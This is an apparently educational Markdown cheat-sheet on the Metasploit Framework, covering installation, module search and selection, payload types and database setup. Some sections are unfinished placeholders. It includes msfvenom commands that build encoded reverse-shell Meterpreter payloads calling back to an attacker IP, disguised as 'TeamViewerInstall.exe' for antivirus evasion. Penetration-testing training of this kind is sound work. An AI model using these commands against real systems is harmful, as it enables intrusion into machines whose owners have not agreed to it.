
# 🕷️ Metasploit Framework  
*Within this eldritch grimoire lies a vast arsenal of arcane tools for network divination, weaving attacks, and unraveling the deepest secrets of target systems. Harness its dark power to evade the watchful eyes, ascend to forbidden privileges, and command dominion after the breach.*

> *“To command the shadows is to master the unseen forces that bind the network.”*

<details>
<summary><h2>⚠️ Warnings to the Seeker of Shrouded Truth ⚠️</h2></summary>

**Do not get tunnel vision.**
> *Beware the madness that comes from gazing too long into a single artifact. The Framework is but one relic among many—do not let it become your crutch or your altar. Use it with intent, not dependence.*

**Please read all the technical documentation you can find for any of our tools.**
> *Before invoking forgotten runes, one must study the glyphs etched in the margins of the old tomes. Knowledge is the warding circle that keeps the daemon in the cage. Read. Absorb. Comprehend.*

**Many tools can prove to be unpredictable.**
> *Every incantation comes with a price. Some conjurations may awaken watchers, leaving ghostly footprints across the target's domain. Others may tear open rifts in your own sanctum. Always proceed with wards in place and a retreat mapped.*

</details>

---

<details>
<summary><h2>📥 Installation</h2></summary>

The official Metasploit Repository can be found [here](https://github.com/rapid7/metasploit-framework/).  

**Install**

```bash
sudo apt update && sudo apt install metasploit-framework
```

**Verify installation**

```bash
msfconsole -q
```

</details>

---

<details>
<summary><h2>📜 Introduction</h2></summary>

**Modules**

```bash
ls /usr/share/metasploit-framework/modules
```  

**Plugins**

```bash
ls /usr/share/metasploit-framework/plugins/
```  

**Scripts**

```bash
ls /usr/share/metasploit-framework/scripts/
```  

**Tools**

```bash
ls /usr/share/metasploit-framework/tools/
```  

</details>

---

<details>
<summary><h2>🧩 MSF Components</h2></summary>

<details>
<summary><h3>Modules</h3></summary>

Metasploit modules are prepared scripts with a specific purpose and corresponding functions that have already been developed and tested in the wild.  

Once we are in the msfconsole, we can select from an extensive list containing all the available Metasploit modules. Each of them is structured into folders, which will look like this:  

**Syntax**  

```bash
<No.> <type>/<os>/<service>/<name>
```  

**Example**  

```bash
794   exploit/windows/ftp/scriptftp_list
```  

<details>
<summary><h4>Explanation</h4></summary>

**Index No.**

The No. tag will be displayed to select the exploit we want afterward during our searches.

**Type**

The `Type` tag is the first level of segregation between the Metasploit modules. Looking at this field, we can tell what the piece of code for this module will accomplish. Some types are not directly usable like an exploit module but are present for structural and modular purposes.

Below is a unified table with all possible module types, their descriptions, and whether they can be used directly as interactable modules (i.e., with `use <no.>`).


| Type      | Description                                                                                   | Interactable |
|-----------|-----------------------------------------------------------------------------------------------|--------------|
| Auxiliary | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.| ✅           |
| Encoders  | Ensure that payloads are intact to their destination.                                         | ❌           |
| Exploits  | Exploit a vulnerability that allows for payload delivery.                                     | ✅           |
| NOPs      | (No Operation code) Keep payload sizes consistent across exploit attempts.                    | ❌           |
| Payloads  | Code that runs remotely and calls back to the attacker to establish a connection or shell.    | ❌           |
| Plugins   | Additional scripts integrated within assessments via `msfconsole`.                            | ❌           |
| Post      | Modules for information gathering, pivoting deeper into the network, and more.                | ✅           |

**OS**  

The OS tag specifies which operating system and architecture the module was created for. Naturally, different operating systems require different code to be run to get the desired results.

**Service**  

The Service tag refers to the vulnerable service that is running on the target machine. For some modules, such as the auxiliary or post ones, this tag can refer to a more general activity such as gather, referring to the gathering of credentials, for example.

**Service**

Finally, the Name tag explains the actual action that can be performed using this module created for a specific purpose.

</details>

<details>
<summary><h4>Search</h4></summary>

Search function

```bash
help search
```  

Searching for a module

```bash
search eternalblue
```  

Specific search

```bash
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```  

Specific payload search

```bash
grep meterpreter show payloads
```

Even more specific search

```bash
grep meterpreter grep reverse_tcp show payloads
```

</details>

<details>
<summary><h4>Select</h4></summary>

Select Module

```bash
use 0
```  

Show options

```bash
options
```  

</details>

<details>
<summary><h4>Set</h4></summary>

**Target Specification**

```bash
set RHOSTS <TARGET IP>
```  

**Permanent Target Specification**

```bash
setg RHOSTS <TARGET IP>
```  

**Target Port Specification**

```bash
set RPORT <TARGET PORT>
```  

**Attacker IP specification**

```bash
set LHOST <ATTACKER IP>
```  

**Permanent Attacker IP specification**

```bash
setg LHOST <ATTACKER IP>
```  

**Attacker Port Specification**

```bash
set LPORT <ATTACKER PORT>
```  

</details>

<details>
<summary><h4>Information</h4></summary>

Show info

```bash
info
```  

</details>

<details>
<summary><h4>Exploit Execution</h4></summary>

Execute

```bash
run
```

</details>

</details>


<details>
<summary><h3>Common Payloads</h3></summary>

The table below contains the most common payloads used for Windows machines and their respective descriptions.


| Payload                             | Description                                                                 |
|-------------------------------------|-----------------------------------------------------------------------------|
| generic/custom                      | Generic listener, multi-use                                                |
| generic/shell_bind_tcp              | Generic listener, multi-use, normal shell, TCP connection binding          |
| generic/shell_reverse_tcp           | Generic listener, multi-use, normal shell, reverse TCP connection          |
| windows/x64/exec                    | Executes an arbitrary command (Windows x64)                                |
| windows/x64/loadlibrary             | Loads an arbitrary x64 library path                                        |
| windows/x64/messagebox              | Spawns a dialog via MessageBox with customizable title, text & icon        |
| windows/x64/shell_reverse_tcp       | Normal shell, single payload, reverse TCP connection                       |
| windows/x64/shell/reverse_tcp       | Normal shell, stager + stage, reverse TCP connection                       |
| windows/x64/shell/bind_ipv6_tcp     | Normal shell, stager + stage, IPv6 Bind TCP stager                         |
| windows/x64/meterpreter/$           | Meterpreter payload + varieties above                                      |
| windows/x64/powershell/$            | Interactive PowerShell sessions + varieties above                          |
| windows/x64/vncinject/$             | VNC Server (Reflective Injection) + varieties above  

</details>

<details>
<summary><h3>Targets</h3></summary>

Targets are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system.

**Show Targets**  

```bash
show targets
```

Regular output:
```bash
# Exploit targets:
# 
#    Id  Name
#    --  ----
#    0   Automatic
```

Exploit-specific output:
```bash
# Exploit targets:
# 
#    Id  Name
#    --  ----
#    0   Automatic
#    1   IE 7 on Windows XP SP3
#    2   IE 8 on Windows XP SP3
#    3   IE 7 on Windows Vista
#    4   IE 8 on Windows Vista
#    5   IE 8 on Windows 7
#    6   IE 9 on Windows 7
```

**Select Targets**  

```bash
set target 6
```

</details>

<details>
<summary><h3>Payloads</h3></summary>

A Payload in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker. There are three different types of payload modules in the Metasploit Framework: Singles, Stagers, and Stages.

**Show all payloads**

```bash
show payloads
```

<details>
<summary><h4>Singles</h4></summary>

A _Single_ payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. A Single payload can be as simple as adding a user to the target system or booting up a process.
</details>

<details>
<summary><h4>Stagers</h4></summary>

_Stager_ payloads work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host. Stagers are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable.  

</details>

<details>
<summary><h4>Stages</h4></summary>

_Stages_ are payload components that are downloaded by stager's modules.  

Payload stages automatically use middle stagers:

* A single recv() fails with large payloads
* The Stager receives the middle stager
* The middle Stager then performs a full download
* Also better for RWX

</details>

</details>

<details>
<summary><h3>Staged Payloads</h3></summary>

A staged payload is, simply put, an exploitation process that is modularized and functionally separated to help segregate the different functions it accomplishes into different code blocks, each completing its objective individually but working on chaining the attack together.  

The scope of this payload, as with any others, besides granting shell access to the target system, is to be as compact and inconspicuous as possible to aid with the Antivirus (AV) / Intrusion Prevention System (IPS) evasion as much as possible.

Reverse connections **(stage0)** are less likely to trigger prevention systems like the one initializing the connection is the victim host, which most of the time resides in what is known as a security trust zone.

After the stable communication channel is established between the attacker and the victim, the attacker machine will most likely send an even bigger payload stage which should grant them shell access **(stage1)**.

<details>
<summary><h4>Meterpreter Payload</h4></summary>

The Meterpreter payload is a specific type of multi-faceted payload that:

- Uses **DLL injection** to establish a stable and covert connection with the victim host.
- Is designed to be **difficult to detect** using simple or conventional system checks.
- Maintains **persistence** across system reboots or changes (depending on configuration).
- Resides **entirely in memory**, leaving **no traces on the hard drive**.
- Evades many **traditional forensic detection techniques**.
- Allows **dynamic loading and unloading of scripts and plugins** during runtime.

</details>

<details>
<summary><h4>Searching for Specific Payload</h4></summary>



</details>

</details>

<details>
<summary><h3>Encoders</h3></summary>

Encoders have assisted with making payloads compatible with different processor architectures while at the same time helping with antivirus evasion. These architectures include:

- x64
- x86
- sparc
- ppc
- mips

Encoders were packed separately from the msfconsole script and were called **msfpayload** and **msfencode**. These two tools are located in _/usr/share/framework2/_.

**Generating Payload - Without Encoding**

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -b "\x00" -f perl
```  

**Generating Payload - With Encoding**

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -b "\x00" -f perl -e x86/shikata_ga_nai
```  

**Generate a payload with the exe format, called TeamViewerInstall.exe**  

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```  

**Generate a payload with the exe format, called TeamViewerInstall.exe running it through multiple iterations**  

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -e x86/shikata_ga_nai -f exe -i 10 -o ./TeamViewerInstall.exe
```  

As expected, most anti-virus products that we will encounter in the wild would still detect this payload so we would have to use other methods for AV evasion.

</details>

<details>
<summary><h3>Databases</h3></summary>

Databases in msfconsole are used to keep track of your results. Msfconsole has built-in support for the PostgreSQL database system. With it, we have direct, quick, and easy access to scan results with the added ability to import and export results in conjunction with third-party tools.

<details>
<summary><h4>Setting up the Database</h4></summary>

**PostgreSQL Status**

```bash
sudo service postgresql status
```  

**Start PostgreSQL**
```bash
sudo systemctl start postgresql
```  

**Initiate a Database**
```bash
sudo apt-get upgrade metasploit-framework
sudo msfdb init
```  

**MSF - Database Status**

```bash
sudo msfdb status
``` 

**MSF - Connect to the Initiated Database**  

```bash
sudo msfdb run
``` 

If, however, we already have the database configured and are not able to change the password to the MSF username, proceed with these commands:

**MSF - Reinitiate the Database**

```bash
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
``` 

**MSF - msf6 Database Status**

```bash
msf6 > db_status
``` 

**MSF - Database Options**  

```bash
msf6 > help database
``` 

**MSF - Using Nmap Inside MSFconsole**  

```bash
msf6 > db_nmap -sV -sS <TARGET IP>
``` 

**MSF - Review scan results**  

```bash
msf6 > hosts -h
msf6 > services -h
msf6 > creds -h
msf6 > loot -h
``` 

**MSF - Database Backup**  

```bash
msf6 > db_export -f xml backup.xml
``` 

</details>

</details>

<details>
<summary><h3>Plugins & Mixins</h3></summary>

Text

</details>

</details>

---

<details>
<summary><h2>🤝 MFS Sessions</h2></summary>

Text

<details>
<summary><h3>Sessions & Jobs</h3></summary>

Text

</details>

<details>
<summary><h3>Meterpreter</h3></summary>

Text

</details>

</details>

---

<details>
<summary><h2>➕ Additional Features</h2></summary>

Text

<details>
<summary><h3>Writing & Importing Modules</h3></summary>

Text

</details>

<details>
<summary><h3>Introduction to MSFVenom</h3></summary>

Text

</details>

<details>
<summary><h3>Firewall and IDS/IPS evasion</h3></summary>

Text

</details>

</details>

---

📘 **Next step:** Continue with [PASSWORD ATTACKS](./07-password-attacks.md)
